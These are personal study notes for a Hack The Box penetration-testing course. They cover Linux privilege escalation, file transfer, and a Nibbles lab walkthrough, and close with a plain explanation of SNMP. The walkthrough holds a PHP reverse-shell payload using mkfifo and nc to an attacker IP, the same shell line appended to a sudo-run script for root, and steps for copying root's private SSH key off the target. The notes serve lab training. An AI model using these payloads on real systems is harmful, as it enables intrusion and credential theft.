# HTB CPTS Moduals
## Getting Started
### Web Enumeration

### Priv Esc
#### Run vuln checklist scripts

```bash
curl -L -o linpeas.sh https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh

chmod +x linpeas.sh

./linpeas.sh


```
#### ssh
```bash
┌─[us-academy-2]─[10.10.14.34]─[htb-ac-1136328@htb-jctqq3hoo2]─[~]
└──╼ [★]$ ssh -p 36803 user1@83.136.253.251


exit

```

#### vuln software
##### linux

```bash
┌──(kali㉿kali)-[~]
└─$ dpkg -l        
Desired=Unknown/Install/Remove/Purge/Hold
| Status=Not/Inst/Conf-files/Unpacked/halF-conf/Half-inst/trig-aWait/Trig-pend
|/ Err?=(none)/Reinst-required (Status,Err: uppercase=bad)
||/ Name                                   Version                              Architecture Description
+++-======================================-====================================-============-======================>
ii  acl                                    2.3.1-3                              amd64        access control list - >
ii  adduser                                3.132                                all          add and remove users a>
ii  adwaita-icon-theme                     43-1                                 all          default icon theme of >
ii  aircrack-ng                            1:1.7-5                              amd64        wireless WEP/WPA crack>
ii  alsa-topology-conf                     1.2.5.1-2                            all          ALSA topology configur>
ii  alsa-ucm-conf                          1.2.8-1                              all          ALSA Use Case Manager >
ii  amass                                  3.23.2-0kali1                        amd64        In-depth DNS Enumerati>
ii  amass-common                           3.23.2-0kali1                        all          In-depth 
```

##### win
```bash
C:\Program Files>dir
 Volume in drive C is OS
 Volume Serial Number is 1206-0611

 Directory of C:\Program Files

2024-05-09  08:35 AM    <DIR>          .
2024-02-19  07:43 AM    <DIR>          4KDownload
2020-08-07  03:14 PM    <DIR>          7-Zip
2022-08-02  01:11 AM    <DIR>          Adobe
2020-05-21  05:51 PM    <DIR>          Alienware
2022-03-29  08:29 PM    <DIR>          AnthemScore
2023-11-01  06:35 AM    <DIR>          Application Verifier
```

#### check priv avail

##### sudo
```bash
┌──(kali㉿kali)-[~]
└─$ sudo -l             
[sudo] password for kali: 
Matching Defaults entries for kali on kali:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User kali may run the following commands on kali:
    (ALL : ALL) ALL

```
switch to the root user
```bash
┌──(kali㉿kali)-[~]
└─$ sudo su  
┌──(root㉿kali)-[/home/kali]
└─# whoami
root
```

##### NOPASSWD entry
1. find a specific app that can run with sudo
2. try to gie to the root shell
```bash
FallenOverlord@htb[/htb]$ sudo -l

    (user : user) NOPASSWD: /bin/echo

FallenOverlord@htb[/htb]$ sudo -u user /bin/echo Hello World!

    Hello World!
```
[list of commands to priv esc thru sudo](https://gtfobins.github.io/)
[priv esc thru win app](https://lolbas-project.github.io/#)


#### Cron Jobs
schduled jobs, done priodically
```bash
/etc/crontab
/etc/cron.d
/var/spool/cron/crontabs/root
```
check wiring primissions
```bash
┌──(kali㉿kali)-[~]
└─$ ls -l /etc/cron.d/

total 20
-rw-r--r-- 1 root root 201 Mar  5  2023 e2scrub_all
-rw-r--r-- 1 root root 607 Nov 10  2022 john
-rw-r--r-- 1 root root 140 Jan 17  2023 ntpsec
-rw-r--r-- 1 root root 712 Jul 13  2022 php
-rw-r--r-- 1 root root 396 Dec  5  2022 sysstat
```
if we can write a dir called by a cron job, then we can write a bash with rev shell


#### exposed credentials
garbage divers  
check config, logs and histories for exposed credentials  
use enum scripts
```bash
...SNIP...
[+] Searching passwords in config PHP files
[+] Finding passwords inside logs (limit 70)
...SNIP...
/var/www/html/config.php: $conn = new mysqli(localhost, 'db_user', 'password123');
```

#### ssh keys

##### use their key
read their private ssh keys found in /home/user/.ssh/id_rsa or /root/.ssh/id_rsa, and use it to log in to the server  
need `read priv`  
after the id_rsa is sent to ur local machine save it as a file
```bash
vim id_rsa
```
give it the correct prem
```bash
chmod 600 id_rsa

r -> 4
w -> 2
x -> 1
first digi: user
sec digi: group
third digi: others

600: usr(r + w);group and others none


ssh user@10.10.10.10 -i id_rsa
```
if the prem is overly premissive, the sever may ban it from working


##### add our key
if we have write priv to /.ssh/ dir, we will place our public key in the authorized_keys dir   
 /home/user/.ssh/authorized_keys  

shell access -> ssh access  
we must already gained control over the user
```{note}
FallenOverlord@htb[/htb]$ ssh-keygen -f key

Generating public/private rsa key pair.
Enter passphrase (empty for no passphrase): *******
Enter same passphrase again: *******

Your identification has been saved in key
Your public key has been saved in key.pub
The key fingerprint is:
SHA256:...SNIP... user@parrot
The key's randomart image is:
+---[RSA 3072]----+
|   ..o.++.+      |
...SNIP...
|     . ..oo+.    |
+----[SHA256]-----+
```
the ssh-keygen command generates a new key, the -f command specific the output file  
This will give us two files: key (which we will use with ssh -i) and key.pub, which we will copy to the remote machine.  
```bash
user@remotehost$ echo "ssh-rsa AAAAB...SNIP...M= user@parrot" >> /root/.ssh/authorized_keys

FallenOverlord@htb[/htb]$ ssh root@10.10.10.10 -i key
```

#### priv esc box
##### horizontal movement
```bash
User user1 may run the following commands on
        ng-1136328-gettingstartedprivesc-kmo8e-b88b89484-jvjss:
    (user2 : user2) NOPASSWD: /bin/bash

FallenOverlord@htb[/htb]$ sudo -u user /bin/bash
user2@ng-1136328-gettingstartedprivesc-kmo8e-b88b89484-jvjss:~$ whoami
user2
user2@ng-1136328-gettingstartedprivesc-kmo8e-b88b89484-jvjss:~$ ls
flag.txt
user2@ng-1136328-gettingstartedprivesc-kmo8e-b88b89484-jvjss:~$ cat flag.txt 
HTB{l473r4l_m0v3m3n7_70_4n07h3r_u53r}

```
##### priv esc to root
before heading into the question, i know i have the bash access for user2, but not the root access.  

spam
```bash
# Check if the file exists and your permissions on it
ls -l /home/user/.ssh/id_rsa
ls -l /root/.ssh/id_rsa

# Try to read the file
cat /home/user/.ssh/id_rsa
cat /root/.ssh/id_rsa

scp -P 36803 user1@83.136.253.251:/root/.ssh/id_rsa /home/

```
now i see that i can read the id_rsa file in the root folder, so i can ssh into the target machine using the private keys provided in the id_rsa file.  
copy all the content when cating the id_rsa file.  
use exit command twice to go back to local machine and make a file to stored the now exfiltrated root's private key.  
once that is sorted out, we want to ssh into the root account on the target machine.  
```bash
┌─[us-academy-2]─[10.10.14.34]─[htb-ac-1136328@htb-jctqq3hoo2]─[~]
└──╼ [★]$ find ~/ -type f -name "id_rsa_2"
/home/htb-ac-1136328/id_rsa_2

┌─[us-academy-2]─[10.10.14.34]─[htb-ac-1136328@htb-jctqq3hoo2]─[~]
└──╼ [★]$ ssh -i /home/htb-ac-1136328/id_rsa_2 root@94.237.56.188 -p 32627
```
the first command is to locate the place i strored the id_rsa file in my local machine.  

### Transferring files
transfer files between remote server and target machine  
msfconsole meterpreter shell: upload

#### wget
first make a py server on the machine that contains the file  
```bash
python3 -m http.server 8000
```

to check the ip address on the server is running on
```bash
ip addr show

ip a

ifconfig


192.168.119.128
┌──(kali㉿kali)-[~]
└─$ ip a        
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:0c:29:d2:08:42 brd ff:ff:ff:ff:ff:ff
    inet 192.168.119.128/24 brd 192.168.119.255 scope global dynamic noprefixroute eth0
       valid_lft 1508sec preferred_lft 1508sec
    inet6 fe80::a501:da0d:d9a2:f090/64 scope link noprefixroute 
       valid_lft forever preferred_lft forever
```

on the machine that we want to download the file
```bash
user@remotehost$ wget http://10.10.14.1:8000/linenum.sh


user@remotehost$ curl http://10.10.14.1:8000/linenum.sh -o linenum.sh
#the -o linenum.sh renames the file after downloading
```

in the last challenge, when i found out that the ip_rsa file on the target machine is readable, i could transfer the ip_rsa file back to my local machine so that i can ssh as root
```bash
scp linenum.sh user@remotehost:/tmp/lineum.sh
```

### Nibbles
common enumeration tactics, basic web application exploitation, and a file-related misconfiguration to escalate privileges

IP  10.10.10.75
OS  Linux
AV  web app

1. bashic enum
look for open ports:  
`nmap -sV --open -oA nibbles_initial_scan 10.129.42.190`  
this will also save the scan results in 3 formats.  
Banner grabbing, double check
  `nc -nv 10.129.42.190 22`  

#### web footprinting
identify the web app
```bash
whatweb 10.129.42.190

┌─[us-academy-2]─[10.10.14.36]─[htb-ac-1136328@htb-yuecbl5gje]─[~]
└──╼ [★]$ whatweb 10.129.141.152
http://10.129.141.152 [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.129.141.152]

```
Next, check the page's source code.  
```bash
curl http://10.129.42.190
```
Try to find hidden directories, for example
```bash
whatweb http://10.129.42.190/nibbleblog

FallenOverlord@htb[/htb]$ whatweb http://10.129.42.190/nibbleblog

http://10.129.42.190/nibbleblog [301 Moved Permanently] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.129.42.190], RedirectLocation[http://10.129.42.190/nibbleblog/], Title[301 Moved Permanently]
http://10.129.42.190/nibbleblog/ [200 OK] Apache[2.4.18], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.129.42.190], JQuery, MetaGenerator[Nibbleblog], PoweredBy[Nibbleblog], Script, Title[Nibbles - Yum yum]
```
##### Dir Enum
check for accessable pages and hidden dir, use gobuster
```bash
FallenOverlord@htb[/htb]$ gobuster dir -u http://10.129.42.190/nibbleblog/ --wordlist /usr/share/dirb/wordlists/common.txt

===============================================================

Gobuster v3.0.1

by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================

[+] Url:            http://10.129.42.190/nibbleblog/
[+] Threads:        10
[+] Wordlist:       /usr/share/dirb/wordlists/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/12/17 00:10:47 Starting gobuster
===============================================================
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/admin (Status: 301)
/admin.php (Status: 200)
/content (Status: 301)
/index.php (Status: 200)
/languages (Status: 301)
/plugins (Status: 301)
/README (Status: 200)
/themes (Status: 301)
===============================================================
2020/12/17 00:11:38 Finished
===============================================================
```
Do a quick google search for the vuln & exploits on the dir -> use msfconsole for exploits

request this file with cURL and prettify the XML output using xmllint
```bash
FallenOverlord@htb[/htb]$ curl -s http://10.129.42.190/nibbleblog/content/private/users.xml | xmllint  --format -

<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<users>
  <user username="admin">
    <id type="integer">0</id>
    <session_fail_count type="integer">2</session_fail_count>
    <session_date type="integer">1608182184</session_date>
  </user>
  <blacklist type="string" ip="10.10.10.1">
    <date type="integer">1512964659</date>
    <fail_count type="integer">1</fail_count>
  </blacklist>
  <blacklist type="string" ip="10.10.14.2">
    <date type="integer">1608182171</date>
    <fail_count type="integer">5</fail_count>
  </blacklist>
</users>
```

10.129.15.8
FallenOverlord@htb[/htb]$ gobuster dir -u http://10.129.42.190/nibbleblog/ --wordlist /usr/share/dirb/wordlists/common.txt

exposed dir
```bash
┌─[us-academy-2]─[10.10.14.36]─[htb-ac-1136328@htb-eqighy8yx8]─[~]
└──╼ [★]$ gobuster dir -u http://10.129.15.8/nibbleblog --wordlist /usr/share/dirb/wordlists/common.txt

/.htpasswd            (Status: 403) [Size: 306]
/.hta                 (Status: 403) [Size: 301]
/.htaccess            (Status: 403) [Size: 306]
/admin                (Status: 301) [Size: 321] [--> http://10.129.15.8/nibbleblog/admin/]
/admin.php            (Status: 200) [Size: 1401]                                          
/content              (Status: 301) [Size: 323] [--> http://10.129.15.8/nibbleblog/content/]
/index.php            (Status: 200) [Size: 2987]                                            
/languages            (Status: 301) [Size: 325] [--> http://10.129.15.8/nibbleblog/languages/]
```

user name
```bash
<users>
<user username="admin">
</user>
<blacklist type="string" ip="10.10.10.1">
<date type="integer">1512964659</date>
<fail_count type="integer">1</fail_count>
</blacklist>
<blacklist type="string" ip="10.10.14.36">
<date type="integer">1715425421</date>
<fail_count type="integer">1</fail_count>
</blacklist>
</users>
```

generate custom wordlist  
prepare for hashcat
```bash
cewl http://10.129.15.8/nibbleblog.com -m 5 -w nibbleblog.txt
```

password: nibbles

#### Initial Foothold

logged in adin pothal -> RCE -> reverse shell  
test payload  
<?php system('id'); ?>  

testing: activating php script  
curl http://10.129.226.202/nibbleblog/content/private/plugins/my_image/image.php

bash RS payload  
<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.36 9443 >/tmp/f"); ?>  

nc listener  
nc -lvnp 9443  

make a friendlier shell  
python3 -c 'import pty; pty.spawn("/bin/bash")'  

activate reverse shell  
curl http://10.129.200.170/nibbleblog/content/private/plugins/my_image/image.php

##### enum using script
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh  

sudo python3 -m http.server 8080  

wget http://10.10.14.36:8080/LinEnum.sh  
```bash
- - [11/May/2024 17:29:45] "GET /LinEnum.sh HTTP/1.1" 200 -

nibbler@Nibbles:/home/nibbler$ ls -la 
-rw-r--r-- 1 nibbler nibbler 46631 May 11 12:26 LinEnum.sh

nibbler@Nibbles:/home/nibbler$ chmod +x LinEnum.sh

nibbler@Nibbles:/home/nibbler$ ls -l /home/nibbler/personal/stuff/monitor.sh
ls -l /home/nibbler/personal/stuff/monitor.sh
-rwxrwxrwx 1 nibbler nibbler 4015 May  8  2015 /home/nibbler/personal/stuff/monitor.sh


```

```bash
nibbler@Nibbles:/home/nibbler/personal/stuff$ echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.36 8443 >/tmp/f' | tee -a  /home/nibbler/personal/stuff/monitor.sh

 nibbler@Nibbles:/home/nibbler/personal/stuff$ sudo /home/nibbler/personal/stuff/monitor.sh \

sudo /home/nibbler/personal/stuff/monitor.sh

┌─[us-academy-2]─[10.10.14.36]─[htb-ac-1136328@htb-nnyvvnfeph]─[~]
└──╼ [★]$ nc -lvnp 8443
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::8443
Ncat: Listening on 0.0.0.0:8443
Ncat: Connection from 10.129.200.170.
Ncat: Connection from 10.129.200.170:35790.
# 

python3 -c 'import pty; pty.spawn("/bin/bash")'

root@Nibbles:/home# ls -la
ls -la
total 12
drwxr-xr-x  3 root    root    4096 Dec 10  2017 .
drwxr-xr-x 23 root    root    4096 Mar 12 09:51 ..
drwxr-xr-x  4 nibbler nibbler 4096 May 11 12:48 nibbler

root@Nibbles:~# cat root.txt
cat root.txt
de5e5d6619862a8aa5b9b212314e0cdd

```

### Knowledge check

```bash
#get info on open ports
nmap -sV --open -oA nibbles_initial_scan 10.129.42.249

whatweb 10.129.42.249

#get webpage content
curl http://10.129.42.249

firefox http://10.129.42.249

whatweb http://get-simple.info/wiki/

#find dir entries
gobuster dir -u http://10.129.42.249 --wordlist /usr/share/dirb/wordlists/common.txt

http://10.129.42.249/robots.txt

http://10.129.42.249//sitemap.xml 

http://10.129.42.249//index.php 

google

searchsploit

metasploit[1]







```

command result
```bash
┌─[us-academy-2]─[10.10.14.36]─[htb-ac-1136328@htb-iy9w8jfwaz]─[~/Desktop]
└──╼ [★]$ nmap -sV --open -oA nibbles_initial_scan 10.129.42.249
Starting Nmap 7.93 ( https://nmap.org ) at 2024-05-12 01:11 BST

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


┌─[us-academy-2]─[10.10.14.36]─[htb-ac-1136328@htb-iy9w8jfwaz]─[~/Desktop]
└──╼ [★]$ whatweb 10.129.42.249
http://10.129.42.249 [200 OK] AddThis, Apache[2.4.41], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.129.42.249], Script[text/javascript], Title[Welcome to GetSimple! - gettingstarted]

┌─[us-academy-2]─[10.10.14.36]─[htb-ac-1136328@htb-iy9w8jfwaz]─[~/Desktop]
└──╼ [★]$ whatweb http://get-simple.info/wiki/
http://get-simple.info/wiki/ [200 OK] Cookies[DWcb100c0f811c1b6d691e3e7c406b56ba,DokuWiki,mybb[lastactive],mybb[lastvisit],sid], Country[UNITED STATES][US], HTML5, HTTPServer[nginx], HttpOnly[DWcb100c0f811c1b6d691e3e7c406b56ba,DokuWiki,sid], IP[72.10.36.125], JQuery, MetaGenerator[DokuWiki], OpenSearch[/wiki/lib/exe/opensearch.php], PHP[5.3.29,], Plesk[Lin], PoweredBy[PHP], Script[text/javascript], Title[start [GetSimple CMS Wiki]], X-Powered-By[PHP/5.3.29, PleskLin], X-UA-Compatible[IE=edge,chrome=1], nginx

/.hta                 (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/admin                (Status: 301) [Size: 314] [--> http://10.129.42.249/admin/]
/backups              (Status: 301) [Size: 316] [--> http://10.129.42.249/backups/]
/data                 (Status: 301) [Size: 313] [--> http://10.129.42.249/data/]   
/index.php            (Status: 200) [Size: 5485]                                   
/plugins              (Status: 301) [Size: 316] [--> http://10.129.42.249/plugins/]
/robots.txt           (Status: 200) [Size: 32]                                     
/server-status        (Status: 403) [Size: 278]                                    
/sitemap.xml          (Status: 200) [Size: 431]                                    
/theme                (Status: 301) [Size: 314] [--> http://10.129.42.249/theme/] 

robots.txt
User-agent: *
Disallow: /admin/

sitemap.xml
<loc>http://gettingstarted.htb/</loc>
<lastmod>2021-02-09T09:53:11+00:00</lastmod>
<changefreq>weekly</changefreq>
<priority>1.0</priority>

┌─[us-academy-2]─[10.10.14.36]─[htb-ac-1136328@htb-iy9w8jfwaz]─[~/Desktop]
└──╼ [★]$ searchsploit apache 2.4.41
----------------------------------------------------- ---------------------------------
 Exploit Title                                       |  Path
----------------------------------------------------- ---------------------------------
Apache + PHP < 5.3.12 / < 5.4.2 - cgi-bin Remote Cod | php/remote/29290.c
Apache + PHP < 5.3.12 / < 5.4.2 - Remote Code Execut | php/remote/29316.py
Apache CXF < 2.5.10/2.6.7/2.7.4 - Denial of Service  | multiple/dos/26710.txt
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuck.c' Remote | unix/remote/21671.c
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remo | unix/remote/47080.c
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remo | unix/remote/764.c
Apache OpenMeetings 1.9.x < 3.1.0 - '.ZIP' File Dire | linux/webapps/39642.txt
Apache Tomcat < 5.5.17 - Remote Directory Listing    | multiple/remote/2061.txt
Apache Tomcat < 6.0.18 - 'utf8' Directory Traversal  | multiple/remote/6229.txt
Apache Tomcat < 6.0.18 - 'utf8' Directory Traversal  | unix/remote/14489.c
Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 / < 8.0.47 / | jsp/webapps/42966.py
Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 / < 8.0.47 / | windows/webapps/42953.txt
Apache Xerces-C XML Parser < 3.1.2 - Denial of Servi | linux/dos/36906.txt
Webfroot Shoutbox < 2.32 (Apache) - Local File Inclu | linux/remote/34.pl
----------------------------------------------------- ---------------------------------


```

[1]msfconsole
```bash
msfconsole

search GetSimple

search GetSimple CMS

use 0

show options

setg username admin

setg password 123456



```

When you cant seem to get to the right information, it is likely your not looking at the right content
```bash
┌─[us-academy-2]─[10.10.14.36]─[htb-ac-1136328@htb-eqighy8yx8]─[~]
└──╼ [★]$ gobuster dir -u http://get-simple.info --wordlist /usr/share/dirb/wordlists/common.txt

/download             (Status: 200) [Size: 10631]                                           
/Download             (Status: 200) [Size: 10631] 
/debug                (Status: 200) [Size: 8265]                                            
Progress: 1214 / 4615 (26.31%)                                            /demo                 (Status: 200) [Size: 8703]   
/changelog            (Status: 200) [Size: 36174]   
/blog                 (Status: 200) [Size: 8335]                                            
/Blog                 (Status: 200) [Size: 8335]     
/privacy              (Status: 200) [Size: 13858]                                             
/Privacy              (Status: 200) [Size: 13858]   
/sitemap.xml          (Status: 200) [Size: 4107]   
/screenshots          (Status: 200) [Size: 10166]  

curl -s http://10.129.35.99/nibbleblog/content/private/config.xml | xmllint --format -


```

### SNMP
What is SNMP?
Imagine SNMP as a manager (protocol) in a large factory (network) who monitors and controls various machines (network devices) such as routers, switches, servers, and IoT devices.

Key Points:
Monitoring and Managing: Just like a manager who ensures that machines are working correctly and makes adjustments as needed, SNMP monitors and manages network devices.
Communication: SNMP communicates over UDP (User Datagram Protocol) ports 161 (for regular communication) and 162 (for alerts, called "traps").
Versions: There are different versions of SNMP, with SNMPv3 being the latest. SNMPv3 is more secure but also more complex, like a manager who uses advanced tools to ensure factory security.
How SNMP Works:
Client-Server Model:

The manager (SNMP client) asks a machine (SNMP server) for its status.
The machine responds with the requested information.
Control Commands:

The manager can also send commands to the machines to change their settings.
Traps:

Machines can send alerts (traps) to the manager if something specific happens, like an overheating issue, without waiting to be asked.
Example:
Routine Check: The manager regularly asks each machine about its temperature. If the temperature is too high, the manager adjusts the cooling system.
Alert (Trap): If a machine detects a potential malfunction, it sends an immediate alert to the manager, who then takes action.
What is MIB?
The Management Information Base (MIB) is like a detailed instruction manual or catalog for each machine in the factory.

Key Points:
Standardized Information: The MIB ensures that the manager understands the information from all machines, even if they are from different manufacturers.
Hierarchy: The MIB organizes information in a tree-like structure, making it easy to find and interpret.
Object Identifiers (OIDs): Each piece of information (like a machine's temperature or status) has a unique identifier, much like a product code in a catalog.
How MIB Works:
List of Information: The MIB lists all the information that can be queried from a device, such as its status, performance metrics, and settings.
Object Identifiers (OIDs): Each piece of information has a unique OID, which helps the manager (SNMP) find and understand it.
Example:
Catalog Entry: In the MIB, you might find an entry for a machine's temperature sensor. It will have an OID, a description, the data type (like integer or string), and access rights (who can read or modify it).
Putting It All Together:
When the SNMP manager wants to check a machine's temperature, it looks up the corresponding OID in the MIB. The machine then provides the temperature reading, and if it's too high, the manager can send a command to adjust the cooling system. If the machine encounters an unexpected issue, it sends a trap to alert the manager immediately.

In summary, SNMP and MIB work together like a manager and a detailed instruction manual to ensure that network devices are monitored and managed efficiently, maintaining smooth operations in the network (factory).

Object Identifier (OID)
An OID (Object Identifier) is like a unique address in a hierarchical directory or a specific location in a vast library. Let's break down what this means:

Key Points:
Hierarchical Structure: Imagine a tree where each branch splits into smaller branches, and each branch represents a category or sub-category. An OID is a specific branch or leaf in this tree.
Sequence of Numbers: Each branch or node in this tree is identified by a sequence of numbers. For example, 1.3.6.1.2.1.1.1 could represent a specific node in this hierarchy.
Dot Notation: The sequence of numbers is written in dot notation, similar to how IP addresses are written (e.g., 192.168.1.1).
Example:
Library Analogy: Think of a library where each book has a unique call number (like an OID). The call number tells you exactly where to find the book in the library, which section, which shelf, and which position on the shelf.
SNMP Versions
Let's dive into the different versions of SNMP to understand how they evolved over time.

SNMPv1
SNMPv1 is the original version of the protocol, and it works well for basic network management tasks. However, it has significant security limitations.

Key Points:
Basic Functionality: SNMPv1 allows for retrieving information from network devices, configuring them, and receiving event notifications (traps).
No Authentication: There's no built-in authentication, meaning anyone who can access the network can potentially read and modify data.
No Encryption: All data is sent in plain text, making it vulnerable to interception.
Example:
Unsecured Office: Imagine an office where anyone can walk in and look at the documents on your desk or change your computer settings. There's no lock on the door, and anyone can see what's happening.
SNMPv2
SNMPv2 introduced improvements but still had security issues, especially in its most commonly used form, SNMPv2c (community-based SNMP).

Key Points:
Improved Functions: SNMPv2 added more functions and improved performance over SNMPv1.
Community Strings: Uses community strings for security, but these are sent in plain text.
No Encryption: Like SNMPv1, SNMPv2c lacks encryption, so data can still be intercepted.
Example:
Neighborhood Watch: Think of it as a neighborhood watch system where only people with the correct community password can interact with devices. However, if someone overhears the password, they can also access the system.
SNMPv3
SNMPv3 addressed the security issues of its predecessors by adding robust security features.

Key Points:
Authentication: Requires a username and password for access.
Encryption: Encrypts data during transmission to prevent interception.
Increased Complexity: The added security features make SNMPv3 more complex to configure and manage.
Example:
Secure Office: This is like an office with a locked door that requires a keycard and a PIN to enter. Inside, sensitive documents are kept in encrypted files, ensuring that only authorized personnel can access and modify them.
Summary
OID: Unique identifiers in a hierarchical structure, like a detailed library catalog.
SNMPv1: Basic, no authentication or encryption, like an unsecured office.
SNMPv2 (v2c): Improved functions but still lacks encryption, similar to a neighborhood watch with a shared password.
SNMPv3: Enhanced security with authentication and encryption, akin to a secure office with keycard access and encrypted files.







